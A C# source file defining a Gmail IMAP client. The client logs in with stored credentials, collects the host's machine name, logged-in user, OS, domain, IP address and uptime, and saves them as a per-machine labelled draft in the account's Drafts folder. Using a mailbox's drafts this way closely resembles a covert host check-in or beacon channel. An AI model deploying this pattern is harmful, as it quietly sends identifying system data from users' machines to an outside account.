using System;
using System.Configuration;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;

public class ImapGmailClient
{
    private readonly string _user;
    private readonly string _password;
    private TcpClient _client;
    private SslStream _stream;
    private string _labelName;
    private int _tagCounter = 1;

    public ImapGmailClient()
    {
        _user = ConfigurationManager.AppSettings["Gmail:Username"];
        _password = ConfigurationManager.AppSettings["Gmail:Password"];
    }

    public void Initialize()
    {
        Log("Starting initialization...");
        Connect();

        var currentUser = GetCurrentLoggedUser();
        _labelName = $"{Environment.MachineName}_{currentUser}";
        Log($"Label: {_labelName}");

        CreateStatusEmail();
        Log("Initialization complete");
    }

    private void Connect()
    {
        Log("Connecting to IMAP...");
        _client = new TcpClient("imap.gmail.com", 993);
        _stream = new SslStream(_client.GetStream());
        _stream.AuthenticateAsClient("imap.gmail.com");

        Log(ReadResponse()); // Welcome message

        SendCommand($"LOGIN \"{_user}\" \"{_password}\"");
        Log("Login successful");
    }

    private string GetCurrentLoggedUser()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher(
                "SELECT UserName FROM Win32_ComputerSystem"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    var fullName = obj["UserName"]?.ToString();
                    return fullName?.Split('\\').Last() ?? Environment.UserName;
                }
            }
        }
        catch (Exception ex)
        {
            Log($"WMI failed: {ex.Message}");
        }

        return Environment.UserName;
    }

    private void CreateStatusEmail()
    {
        Log("Creating status email...");
        var content = BuildStatusEmail();

        SendCommand($"APPEND \"[Gmail]/Drafts\" (\\Draft) {{{content.Length}}}");
        SendRaw(content);

        Log("Status email created in Drafts");
    }

    private string BuildStatusEmail()
    {
        var sb = new StringBuilder();
        var info = CollectSystemInfo();

        sb.AppendLine($"From: {_user}");
        sb.AppendLine($"To: {_user}");
        sb.AppendLine($"Subject: [STATUS] {_labelName}");
        sb.AppendLine($"Date: {DateTime.UtcNow:R}");
        sb.AppendLine($"X-Gmail-Labels: {_labelName}");
        sb.AppendLine();
        sb.AppendLine($"=== System Status Report ===");
        sb.AppendLine($"Timestamp: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
        sb.AppendLine();
        sb.AppendLine(info);

        return sb.ToString();
    }

    private string CollectSystemInfo()
    {
        var sb = new StringBuilder();

        sb.AppendLine($"Machine: {Environment.MachineName}");
        sb.AppendLine($"User: {GetCurrentLoggedUser()}");
        sb.AppendLine($"OS: {Environment.OSVersion}");
        sb.AppendLine($"Domain: {Environment.UserDomainName}");
        sb.AppendLine($"IP: {GetPrimaryIp()}");
        sb.AppendLine($"Uptime: {GetUptime():F1} hours");
        sb.AppendLine($".NET: {Environment.Version}");

        return sb.ToString();
    }

    private string GetPrimaryIp()
    {
        return NetworkInterface.GetAllNetworkInterfaces()
            .Where(n => n.OperationalStatus == OperationalStatus.Up)
            .SelectMany(n => n.GetIPProperties().UnicastAddresses)
            .Where(a => a.Address.AddressFamily == AddressFamily.InterNetwork)
            .Select(a => a.Address.ToString())
            .FirstOrDefault() ?? "0.0.0.0";
    }

    private double GetUptime()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher(
                "SELECT LastBootUpTime FROM Win32_OperatingSystem"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    var bootTime = ManagementDateTimeConverter.ToDateTime(
                        obj["LastBootUpTime"].ToString());
                    return (DateTime.Now - bootTime).TotalHours;
                }
            }
        }
        catch { }

        return 0;
    }

    private void SendCommand(string command)
    {
        var tag = $"A{_tagCounter++:D3}";
        var fullCommand = $"{tag} {command}";
        Log($">> {fullCommand.Substring(0, Math.Min(100, fullCommand.Length))}");

        var data = Encoding.ASCII.GetBytes(fullCommand + "\r\n");
        _stream.Write(data, 0, data.Length);

        var response = ReadResponse();
        Log($"<< {response.Substring(0, Math.Min(200, response.Length))}");
    }

    private void SendRaw(string data)
    {
        Log($">> RAW ({data.Length} bytes)");
        var bytes = Encoding.UTF8.GetBytes(data + "\r\n");
        _stream.Write(bytes, 0, bytes.Length);
        ReadResponse();
    }

    private string ReadResponse()
    {
        var buffer = new byte[8192];
        var bytesRead = _stream.Read(buffer, 0, buffer.Length);
        return Encoding.ASCII.GetString(buffer, 0, bytesRead);
    }

    private void Log(string message)
    {
        var log = $"[IMAP {DateTime.Now:HH:mm:ss}] {message}";
        Console.WriteLine(log);
        Debug.WriteLine(log);
    }

    public void Dispose()
    {
        _stream?.Dispose();
        _client?.Dispose();
    }
}
